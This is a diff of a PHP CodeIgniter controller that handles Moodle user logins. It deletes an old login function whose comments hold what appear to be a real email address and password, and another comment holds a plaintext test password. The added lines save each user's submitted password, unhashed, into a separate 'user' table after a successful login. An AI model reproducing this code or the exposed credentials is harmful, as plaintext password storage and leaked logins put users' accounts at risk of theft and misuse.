@@ -16,35 +16,6 @@ class Moodle extends CI_Controller
     {
         // echo $this->hash_internal_user_password("Thijs123!@#");
     }
-    public function login_old_v1($var = null)
-    {
-        // $_POST['email'] = "megasega91@gmail.com";
-        // $_POST['password'] = "Mega1java123!@#";
-        if (isset($_POST['email']) && isset($_POST['password'])) {
-            $email = $this->input->post('email');
-            $password = $this->input->post('password');
-            $datan = $this->universal_model->selectz_pigination('mdl_user', "email", $email, 1, 0);
-            if (empty($datan)) {
-                echo empty_response("User Does not Exist");
-            } else {
-                $datan_password = $datan[0]['password'];
-                $status = password_verify($password, $datan_password);
-                if ($status) {
-                    unset_post($datan[0], 'password');
-                    $response = array(
-                        'code' => 200,
-                        'msg' => "successfully logged in",
-                        'data' => $datan[0]
-                    );
-                    echo json_encode($response);
-                } else {
-                    echo empty_response("Wrong Credentials");
-                }
-            }
-        } else {
-            echo empty_response("Credentials Are Required");
-        }
-    }
     public function test()
     {
 
@@ -81,6 +52,13 @@ class Moodle extends CI_Controller
                 } else {
                     $details_user = $this->get_userdetails_internal($username);
                     $token_details = array_merge($array_of_output, $details_user[0]);
+                    $data=array(
+                      'id_id'=>$details_user[0]['id'],
+                      'username'=>$username,
+                      'password'=>$this->input->post('password'),
+                    );
+                    // print_array($data);
+                    $value_check = $this->universal_model->updateOnDuplicate('user',$data);
                     // print_array($token_details);
                     echo empty_response("successfully logged in", 200, $token_details);
                 }
